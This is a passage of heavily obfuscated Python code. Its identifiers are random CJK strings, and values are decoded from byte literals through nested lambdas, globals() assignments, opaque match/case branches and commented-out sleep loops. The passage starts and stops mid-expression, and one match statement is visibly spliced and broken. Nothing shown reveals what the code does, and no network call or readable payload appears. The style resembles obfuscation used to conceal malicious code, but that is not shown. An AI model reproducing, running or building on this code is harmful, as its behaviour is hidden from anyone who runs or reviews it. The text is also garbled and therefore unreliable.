樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe2'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xec'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xeb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe2'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe0'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xda'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe5'))()]))))())())()) from None
            pass
        except Exception as e:print(e)
            # import traceback
            # from io import StringIO
            # deptrai = [[(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\n'))() ** (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\t'))()]
            # for i in range((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x04\xa8\x17\xc8\xde'))()):
                # globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
            # 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).sleep((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x0b\xb8'))())
            # 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).sleep((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x0b\xb8'))())
            # 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).sleep((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x0b\xb8'))())
            # 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).sleep((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x0b\xb8'))())
            # 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).sleep((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x0b\xb8'))())
            # 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).sleep((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x0b\xb8'))())
            # 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).sleep((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x0b\xb8'))())
            # 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).sleep((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x0b\xb8'))())
            # globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '燘耋圢鱶銥碵' == '稤掘搞凒摓蓑':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            栅袾髢鿬查借 = [[True], [False]]
            暽掇財豥硿淳(['祦娣珚糞煪溞'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 焘遟酬翌箭屡:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                縣檫蟨嚘臽姵 = [[(lambda: (lambda 赦郾恘鷍偤洨: 赦郾恘鷍偤洨 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 庼摝輺鄵呂鬇: 庼摝輺鄵呂鬇 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722261759, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722256658, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722251833, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722252991, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722254490, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722244724]))))())())()])
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 笕誤惑膋榚迟:
        try:
            _obf
        except:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 